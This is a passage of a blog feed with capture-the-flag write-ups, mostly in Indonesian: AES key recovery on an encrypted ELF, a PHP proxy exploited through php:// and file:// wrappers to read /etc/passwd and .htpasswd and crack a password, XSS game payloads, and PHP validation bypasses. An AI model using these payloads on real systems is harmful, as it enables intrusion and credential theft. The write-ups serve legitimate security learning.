  
  <category scheme="http://localhost:4000/tags/#CTF" term="CTF" />
  
  
  <content type="html">
  
    &lt;h3 id=&quot;soal&quot;&gt;Soal&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ file myelf
myelf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=a117956f8826f8ccb19ac6be9d48808c66d1f357, not stripped
Dapatkan kembali file myelf yang telah dienkripsi menggunakan encrypt.py!
http://139.59.233.122/soal/crypto/encrypted-elf-revised/encrypt.py
http://139.59.233.122/soal/crypto/encrypted-elf-revised/encryptedelf
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;solusi&quot;&gt;Solusi&lt;/h3&gt;

&lt;p&gt;Goals nya Membuat fungsi untuk melakukan dekripsi ELF nya dengan memanfaatkan IV dan&lt;br /&gt;
KEY yang ada di append ke akhir binary dan di XOR dengan magic header ELF&lt;br /&gt;
binary&lt;/p&gt;

&lt;p&gt;Kami membuat script python untuk mengambil IV dan KEY dari bawah file yang&lt;br /&gt;
terencrypt kemudian memisahkan chunks dengan filesize yang ada pada 8 byte&lt;br /&gt;
awal file encryptedelf​ dan kemudian kami melakukan recovery IV dan KEY dengan&lt;br /&gt;
melakukan XOR dengan magic header ELF Binary&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def decrypt_file(in_filename, out_filename, chunksize=64*1024):
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:

            chunk = infile.read(chunksize)
            ch = chunk[8:-32]
            chn = ['\x7f', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00']

            v = chunk[-32:-16:]
            k = chunk[-16:]

            iv = ''.join(chr(ord(chn[i]) ^ ord(v[i])) for i in range(0, 16))

            print &quot;IV: &quot;+ iv
            key = ''.join(chr(ord(chn[i]) ^ ord(k[i])) for i in range(0, 16))
            print &quot;KEY: &quot;+ key

            handler = AES.new(key, AES.MODE_CBC, iv)
            outfile.write(handler.decrypt(ch))

decrypt_file('encryptedelf','origelf')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/encryptedelf-flag.png&quot; alt=&quot;encryptedelf-flag.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kemudian di jalankan scriptnya untuk melakukan decrypt binary tersebut.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Flag : FIT2017{this_time_is_modern_cipher}&lt;/strong&gt;&lt;/p&gt;


  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/crypto/writeup-fit-funfest-ctf.encryptedelf&quot;&gt;Writeup FIT FUNFEST 2017 : EncryptedELF&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 16, 2017.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Writeup FIT FUNFEST 2017 : Proxy]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/writeup-fit-funfest-ctf-proxy"/>
  <id>http://localhost:4000/web%20exploitation/writeup-fit-funfest-ctf-proxy</id>
  <published>2017-03-16T00:00:00+07:00</published>
  <updated>2017-03-16T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#FIT" term="FIT" />
  
  
  
  <category scheme="http://localhost:4000/tags/#CTF" term="CTF" />
  
  
  <content type="html">
  
    &lt;h3 id=&quot;soal&quot;&gt;Soal&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;http://128.199.66.146:12121/proxy/
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;solusi&quot;&gt;Solusi&lt;/h3&gt;

&lt;p&gt;Diberikan website seperti layanan proxy kita bisa mengakses website lain melalui
layanan tersebut kemudian kita memanfaatkan Wrappers yang tidak di blacklist
untuk membaca file config dan menemukan folder secret yang di authentikasi
dengan Basic HTTP Authentication kami melakukan decrpyt password .htpasswd
yang di gunakan algoritma {SHA} kemudian kami mengauthentikasi dan
mendapatkan flag&lt;/p&gt;

&lt;p&gt;Setelah melakukan analisa kepada layanan yang tersedia yaitu proxy untuk
membuka website di input field nya ada placeholder http atau https tapi ternyata ada beberapa wrappers yang masih bisa di gunakan karena tidak di disable atau di blacklist. Pertama kita bisa mendapatkan source code layanan proxy dalam base64 dan melakukan decode untuk membaca source code aslinya dengan command&lt;/p&gt;

&lt;p&gt;&lt;code&gt;curl http://128.199.66.146:12121/proxy/?url=php://filter/convert.base64-encode/resource=index.php | base64 -d &amp;gt; index.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
error_reporting(0);
if (isset($_GET['url'])) {
$url = $_GET['url'];
if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
die('Not a valid URL');
}
$content = file_get_contents($url);
die($content);
}
?&amp;gt;
&amp;lt;header&amp;gt;
&amp;lt;title&amp;gt;Proxy&amp;lt;/title&amp;gt;
&amp;lt;link
href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:300'
rel='stylesheet' type='text/css'&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt;
.form-style-8{
font-family: 'Open Sans Condensed', arial, sans;
width: 500px;
padding: 30px;
background: #FFFFFF;
margin: 50px auto;
box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
-moz-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
-webkit-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
}
.form-style-8 h2{
background: #4D4D4D;
text-transform: uppercase;
font-family: 'Open Sans Condensed', sans-serif;
color: #797979;
font-size: 18px;
font-weight: 100;
padding: 20px;
margin: -30px -30px 30px -30px;}
.form-style-8 input[type=&quot;text&quot;],
.form-style-8 input[type=&quot;date&quot;],
.form-style-8 input[type=&quot;datetime&quot;],
.form-style-8 input[type=&quot;email&quot;],
.form-style-8 input[type=&quot;number&quot;],
.form-style-8 input[type=&quot;search&quot;],
.form-style-8 input[type=&quot;time&quot;],
.form-style-8 input[type=&quot;url&quot;],
.form-style-8 input[type=&quot;password&quot;],
.form-style-8 textarea,
.form-style-8 select
{
box-sizing: border-box;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
outline: none;
display: block;
width: 100%;
padding: 7px;
border: none;
border-bottom: 1px solid #ddd;
background: transparent;
margin-bottom: 10px;
font: 16px Arial, Helvetica, sans-serif;
height: 45px;
}
.form-style-8 textarea{
resize:none;
overflow: hidden;
}
.form-style-8 input[type=&quot;button&quot;],
.form-style-8 input[type=&quot;submit&quot;]{
-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
box-shadow: inset 0px 1px 0px 0px #45D6D6;
background-color: #2CBBBB;
border: 1px solid #27A0A0;
display: inline-block;
cursor: pointer;
color: #FFFFFF;
font-family: 'Open Sans Condensed', sans-serif;font-size: 14px;
padding: 8px 18px;
text-decoration: none;
text-transform: uppercase;
}
.form-style-8 input[type=&quot;button&quot;]:hover,
.form-style-8 input[type=&quot;submit&quot;]:hover {
background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
background-color:#34CACA;
}
&amp;lt;/style&amp;gt;
&amp;lt;/header&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div class=&quot;form-style-8&quot;&amp;gt;
&amp;lt;h2&amp;gt;PROXY&amp;lt;/h2&amp;gt;
&amp;lt;form&amp;gt;
&amp;lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;http:// or https://&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Kurang lebih source code tersebut seperti di atas&lt;/p&gt;

&lt;p&gt;Kemudian kami mencoba mencari cara untuk mendapatkan Remote Code Injection
karena kami belum menemukan lokasi flag berada.
Kami juga mencoba membaca beberapa file berikut dengan wrappers file://&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://128.199.66.146:12121/proxy/index.php?url=file:///etc/passwd
http://128.199.66.146:12121/proxy/index.php?url=file:///home/web-x/.bash_history
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/hosts
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/default
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-x
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-y
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pada file /etc/nginx/sites-available/default kami melihat ada directory rahasia yang di
proteksi dengan ​ HTTP Basic Authentication&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;location /secret_page_uksw/ {
try_files $uri $uri/ =404;
autoindex on;
auth_basic &quot;Restricted Content&quot;;
auth_basic_user_file /etc/nginx/.htpasswd;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Kita baca file .htpasswd nya dengan url berikut&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/.htpasswd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;isinya seperti ini&lt;/p&gt;

&lt;p&gt;&lt;code&gt;fit-uksw:{SHA}NABfMvw51MY+i1z+THOgpy9oysc=&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/dectypt-sha1-htpasswd.png&quot; alt=&quot;dectypt-sha1-htpasswd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kemudian kami crack password yang ada pada .htpasswd tersebut sehingga di
temukan plain text dari password adalah “indonesia45”
Selanjutnya kita cari di mana folder /secret_page_uksw/ berada pertama coba di
http://128.199.66.146:12121/secret_page_uksw/ namun masih not found, kami
coba baca lagi konfigurasi nginx nya ternyata port nya ngak di custom, dia
menggunakan port default yang terletak pada http://128.199.66.146/secret_page_uksw/ Kemudian kami masukan username danpassword untuk basic authentication &lt;strong&gt;fit-uksw:indonesia45&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secret-page-proxy-flag.png&quot; alt=&quot;secret-page-proxy-flag.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FIT2017{not_only_know_web_bug_but_also_server_config}&lt;/strong&gt;&lt;/p&gt;

  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/writeup-fit-funfest-ctf-proxy&quot;&gt;Writeup FIT FUNFEST 2017 : Proxy&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 16, 2017.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Writeup XSS Appspot]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/writeup-xss-appspot"/>
  <id>http://localhost:4000/web%20exploitation/writeup-xss-appspot</id>
  <published>2017-01-31T00:00:00+07:00</published>
  <updated>2017-01-31T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#xss" term="xss" />
  
  
  
  <category scheme="http://localhost:4000/tags/#ctf" term="ctf" />
  
  
  
  <category scheme="http://localhost:4000/tags/#web" term="web" />
  
  
  <content type="html">
  
    &lt;h2 id=&quot;level-1&quot;&gt;Level 1&lt;/h2&gt;

&lt;h3 id=&quot;problem&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping.&lt;/p&gt;

&lt;p&gt;Interact with the vulnerable application window below and find a way to make it execute JavaScript of your choosing. You can take actions inside the vulnerable window or directly edit its URL bar.&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;parameter query langsung masuk sebagai html jadi kita bisa kirim payload &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-2&quot;&gt;Level 2&lt;/h2&gt;

&lt;h3 id=&quot;problem-1&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully.&lt;/p&gt;

&lt;p&gt;This level shows how easily XSS bugs can be introduced in complex apps.&lt;/p&gt;

&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Payload &lt;code&gt;&amp;lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-3&quot;&gt;Level 3&lt;/h2&gt;

&lt;h3 id=&quot;problem-2&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;As you’ve seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood.&lt;/p&gt;

&lt;p&gt;The application on this level is using one such hidden sink.&lt;/p&gt;

&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;dari potongan javascript ini&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
    &amp;lt;script&amp;gt;
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = &quot;Image &quot; + parseInt(num) + &quot;&amp;lt;br&amp;gt;&quot;;
        html += &quot;&amp;lt;img src='/static/level3/cloud&quot; + num + &quot;.jpg' /&amp;gt;&quot;;
        $('#tabContent').html(html);
 
        window.location.hash = num;
 
        // Select the current tab
        var tabs = document.querySelectorAll('.tab');
        for (var i = 0; i &amp;lt; tabs.length; i++) {
          if (tabs[i].id == &quot;tab&quot; + parseInt(num)) {
            tabs[i].className = &quot;tab active&quot;;
            } else {
            tabs[i].className = &quot;tab&quot;;
          }
        }
 
        // Tell parent we've changed the tab
        top.postMessage(self.location.toString(), &quot;*&quot;);
      }
 
      window.onload = function() { 
        chooseTab(self.location.hash.substr(1) || &quot;1&quot;);
      }
 
      // Extra code so that we can communicate with the parent page
      window.addEventListener(&quot;message&quot;, function(event){
        if (event.source == parent) {
          chooseTab(self.location.hash.substr(1));
        }
      }, false);
    &amp;lt;/script&amp;gt;
    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;yang menarik adalah bagian ini &lt;code&gt;html += &quot;&amp;lt;img src='/static/level3/cloud&quot; + num + &quot;.jpg' /&amp;gt;&quot;;&lt;/code&gt;
terlihat input kita masuk ke tag img kemudian di tambain “ .jpg’ “
maka kita bisa kirim payload gambar yang tidak ada , dan kita tambahkan event onerror
payload &lt;code&gt;' onerror=alert(1) alt='&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-4&quot;&gt;Level 4&lt;/h2&gt;

&lt;h3 id=&quot;problem-3&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.&lt;/p&gt;

&lt;h3 id=&quot;solution-3&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;disini fungsi start timer di panggil di dalam onload event dan input kita masuk ke parameter dari fungsi starttime
karena dalam event html kita bisa panggil multiple function jadi kita bisa tambahin function alert pake separator ;
&lt;code&gt;200');alert(1)&lt;/code&gt; tapi itu belum work sebelum kita kirim pake url encode &lt;code&gt;200%27%29%3Balert%28%271&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-5&quot;&gt;Level 5&lt;/h2&gt;

&lt;h3 id=&quot;problem-4&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;Cross-site scripting isn’t just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.&lt;/p&gt;

&lt;h3 id=&quot;solution-4&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Input kita di parameter ?next= itu masuk ke dalam tag &lt;code&gt;&amp;lt;a href=&quot;{next}&quot;&amp;gt;&lt;/code&gt;
simple kita bisa inject javascriptnya&lt;/p&gt;

&lt;p&gt;&lt;code&gt;javascript:alert(1)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;atau juga bisa pake &lt;code&gt;data:text/html,&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; yang di urlencode jadi
&lt;code&gt;data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-6&quot;&gt;Level 6&lt;/h2&gt;

&lt;h3 id=&quot;problem-5&quot;&gt;Problem&lt;/h3&gt;

&lt;p&gt;Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash.&lt;/p&gt;

&lt;p&gt;This is very tricky to get right – allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;solution-5&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Kita ngak bisa pake protocol http atau https untuk load file nya
karena dia ada cek&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById(&quot;log&quot;),
          &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);
        return;
      }
      
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;kita host &lt;code&gt;alert(1)&lt;/code&gt; ke pastebin terus kita load tapi bukan pake http atau https atau protokol lain tapi
pake &lt;code&gt;//pastebin.com/raw/6aV0qLz3&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;read more : &lt;a href=&quot;http://stackoverflow.com/questions/9646407/two-forward-slashes-in-a-url-src-href-attribute/9646435#9646435&quot;&gt;2 Forward slashes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/solve-xss.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/writeup-xss-appspot&quot;&gt;Writeup XSS Appspot&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on January 31, 2017.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Writeup AkiCTF]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/katsudon-ctf"/>
  <id>http://localhost:4000/web%20exploitation/katsudon-ctf</id>
  <published>2017-01-30T00:00:00+07:00</published>
  <updated>2016-11-09T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#AkiCTF" term="AkiCTF" />
  
  
  <content type="html">
  
    &lt;h2 id=&quot;writeup-akictf&quot;&gt;Writeup AkiCTF&lt;/h2&gt;

&lt;p&gt;ini sebenernya ctf yang udah lama kayaknya ini mulai pas tahun 2013, tapi 
challenge nya menurut gw masih legit buat di cobain link nya di sini &lt;a href=&quot;http://ctf.katsudon.org/&quot;&gt;AkiCTF&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;game-1---70-points&quot;&gt;Game #1 - 70 Points&lt;/h3&gt;

&lt;p&gt;Deskripsi soal nya gak ada sama sekali, kita cuma di kasih link &lt;a href=&quot;http://q6.ctf.katsudon.org&quot;&gt;q6.ctf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dari website nya kita bisa liat di situ ada game RPS(rock, papper,scissor) dan di bagian bawahnya ada 
rangking yang kalau sepertinya kalau duit kita cukup untuk beli ranking nya flagnya bakal muncul&lt;/p&gt;

&lt;p&gt;view pagesource nya kita bisa liat di situ ada kode javascript berikut :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;
&amp;lt;script&amp;gt;
    $(function() {
        var d = $(&quot;#h&quot;),     // id h 
            c = $(&quot;#money&quot;), // duit kita diambil dari sini
            b = $(&quot;#message&quot;); // id message 
        
        $(&quot;#jankenForm&quot;).submit(function() { // kalau form RPS nya kita submit
            0 &amp;lt; c.text() &amp;amp;&amp;amp; $.post(&quot;/janken&quot;, { // kirim post 
                h: d.val(), // parameter h di ambil dari variable d.val()
                money: c.text() // parameter money di ambil dari c.text
            }).done(function(a) { 
                a.error ? b.text(&quot;error&quot;) : (d.val(a.h), c.text(a.money), b.text(a.message))
            }).fail(function() {
                b.text(&quot;Oops... Try again later.&quot;)
            });
            return !1
        });
        
        $(&quot;#registerForm&quot;).submit(function() {
            $.post(&quot;/register&quot;, {
                h: d.val(),
                money: c.text()
            }).done(function(a) {
                a.error ? b.text(&quot;error&quot;) : b.text(a.message)
            }).fail(function() {
                b.text(&quot;Oops... Try again later.&quot;)
            });
            return !1
        })
    });
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;kalau kita liat javascriptnya dia kan ambil money langsung dari #money tapi kalau kita ganti
misalnya inspect element jadi 99999999 terus kita coba register bakal output nya jadi error
kenapa? karena pas di post ada 2 parameter yang di lempar selain parameter money, yaitu parameter h&lt;/p&gt;

&lt;p&gt;isi variable h adalah md5 &lt;code&gt;d3d9446802a44259755d38e6d163e820 = 10&lt;/code&gt; jadi yang di kirim di parameter h adalah
hash md5 dari money yang nanti bakal di validasi lagi di server nya jadi untuk ngecoh validasinya
kita modifikasi #money sama value dari h&lt;/p&gt;

&lt;p&gt;jadi kita bisa langsung kirim ke register dan atur duitnya sesuka kita : 
&lt;code&gt;curl 'http://q6.ctf.katsudon.org/register' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' --data 'h=c8c605999f3d8352d7bb792cf3fdb25b&amp;amp;money=999999999' --compressed&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;flag bakal muncul di response nya 
&lt;code&gt;{&quot;message&quot;:&quot;Congrats! The flag is &quot;XXXXXXXXX&quot;.&quot;}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;from-login-form---120-points&quot;&gt;From login form - 120 Points&lt;/h3&gt;

&lt;p&gt;To be continue,&lt;/p&gt;

  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/katsudon-ctf&quot;&gt;Writeup AkiCTF&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on January 30, 2017.&lt;/p&gt;</content>
</entry>





<entry>
  <title type="html"><![CDATA[ITRACE 2016 Level 3: Writeups]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/itrace-2016-level3-writeup"/>
  <id>http://localhost:4000/ctf/itrace-2016-level3-writeup</id>
  <published>2016-10-10T00:00:00+07:00</published>
  <updated>2016-10-10T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#ITRACE%202016" term="ITRACE 2016" />
  
  
  <content type="html">
  
    &lt;h2 id=&quot;website--compare-us---40-point&quot;&gt;Website : Compare Us - 40 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Compare Us
Point : 40
Category : #web
Description :
http://task-00000001.itrace.systems/compare-us.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Di task ini kita harus melakukan bypass terhadap beberapa validasi
untuk mendapatkan flag. Source soal di berikan :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    error_reporting(0);
    include 'flag.php';
    $check=thepassword();
    parse_str($_SERVER['QUERY_STRING']);
    $A=$_GET['key'];
    if(ctype_xdigit($A)){
        $e=implode('',array_map(function($i,$A){return chr(hexdec($A{$i+$i}.$A{$i+($i+1)}));},list($m,$n,$o)=range(0,2),array($A,$A,$A)));
        if($e&amp;lt;1 &amp;amp;&amp;amp; $e&amp;gt;0 &amp;amp;&amp;amp; $e!==0){
            if((int)(substr($A,strlen($e)*2)+0) &amp;lt; -1){
                if($check==$_GET['password']){
                    echo flag();
                } else {
                    echo 'Bad.';
                }
            } else {
                echo 'Bad.';
            }
        } else {
            echo 'Bad.';
        }
    } else {
        echo 'Bad.';
    }
    echo &quot;&amp;lt;pre&amp;gt;&quot;;
    echo htmlentities(highlight_string(file_get_contents(__FILE__)));
    echo &quot;&amp;lt;/pre&amp;gt;&quot;;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pertama input kita di validasi dengan &lt;code&gt;ctype_xdigit($A)&lt;/code&gt; yang di terima adalah [0-9a-f]
kemudian ada validasi lagi nah &lt;code&gt;if($e&amp;lt;1 &amp;amp;&amp;amp; $e&amp;gt;0 &amp;amp;&amp;amp; $e!==0)&lt;/code&gt;
$e yang di hasilkan harus di antara 0 dan 1. &lt;code&gt;302e35&lt;/code&gt; adalah hexadecimal dari 0.5 dan
berhasil melewati validasi tersebut.&lt;/p&gt;

&lt;p&gt;kemudian &lt;code&gt;if((int)(substr($A,strlen($e)*2)+0) &amp;lt; -1)&lt;/code&gt; di tahap ini kita
harus membuat hasil dari substr yang di cast ke integer memberikan output &amp;lt; -1
kemungkinan yang bisa kita lakukan adalah dengan melakukan integer overflow,
dengan &lt;code&gt;29999999999999999999999999999&lt;/code&gt; ternyata sudah berhasil menjadikan minus outputnya.&lt;/p&gt;

&lt;p&gt;kemudian &lt;code&gt;if($check==$_GET['password'])&lt;/code&gt; hampir terasa mustahil untuk menebak apa
isi dari variable &lt;code&gt;$check&lt;/code&gt; karena kita tidak bisa mengakses file &lt;code&gt;flag.php&lt;/code&gt;
tapi ternyata ada pemanggilan fungsi &lt;code&gt;parse_str($_SERVER['QUERY_STRING']);&lt;/code&gt; yang memberikan kita peluang untuk melakukan
overwrite variable yang sudah ada simply &lt;code&gt;?&amp;amp;check=dor&amp;amp;password=dor&lt;/code&gt; maka input kita berhasil bypass validasi tersebut.&lt;/p&gt;

&lt;p&gt;Full payload : &lt;code&gt;curl &quot;http://task-00000001.itrace.systems/compare-us.php?key=302e3529999999999999999999999999999&amp;amp;check=dor&amp;amp;password=dor&quot; |grep -o ITRACE{[a-z0-9_]*}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;flag : &lt;code&gt;ITRACE{r1d1n9_i5_34513r_th4n_r34d1n9}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-ajax-xaja---25-point&quot;&gt;Website: AJAX XAJA - 25 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : AJAX XAJA
Point : 25
Category : #web
Description :
command: flag&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ketik command flag di website dan cek ajax response via developer tools&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ajax&quot;&gt;{command: &quot;flag&quot;, flag: &quot;Congratulations. This is your flag: ITRACE{Asynchronous_Javascript_And_XML}&quot;,…}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-not-heart-bleed---43-point&quot;&gt;Website: Not Heart Bleed - 43 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Not Heart Bleed
Point : 43
Category : #web
Description :
http://task-00001110.itrace.systems/request.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Karena di server hanya menerima UTF-8 kita coba2 kirim character non-UTF
dan server mengembalikan response hexadecimal yang di decode menghasilkan flag&lt;/p&gt;

&lt;p&gt;Full payload : &lt;code&gt;curl -X POST --data &quot;request=���������������������&quot; http://task-00001110.itrace.systems/request.php | cut -d&quot;\&quot;&quot; -f 4 | grep 0[x][0-9a-f]* | sed -e 's/0x//g' | rev | cut -b 6-55 | rev | xxd -r &amp;gt; a &amp;amp;&amp;amp; echo -n &quot;ITR&quot; &amp;amp;&amp;amp; cat a &amp;amp;&amp;amp; rm a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{Y4Y_TO_345Y}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;forensic-lorem-is-not-ipsum---13-point&quot;&gt;Forensic: Lorem is not Ipsum - 13 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Lorem is not Ipsum
Point : 13
Category : #forensic #warmup
Description :
http://task-00000100.itrace.systems/loremisnotipsum.tar.gz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Setelah file soal di extract ada kurang lebih 63 file raw text yang berisi paragraf lorem ipsum, tapi 
tiap file memikili beberapa part yang berbeda. saya gunakan python untuk mengextract flag.&lt;/p&gt;

